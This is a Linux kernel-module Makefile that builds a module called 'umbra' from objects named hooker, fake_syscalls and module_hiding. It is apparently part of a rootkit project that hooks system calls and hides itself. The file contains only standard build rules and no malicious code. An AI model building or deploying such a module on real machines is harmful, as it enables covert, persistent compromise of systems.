obj-m := umbra.o
umbra-y := main.o hooker.o fake_syscalls.o module_hiding.o

ccflags-y += -g -DDEBUG

KDIR ?= /lib/modules/$(shell uname -r)/build

PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
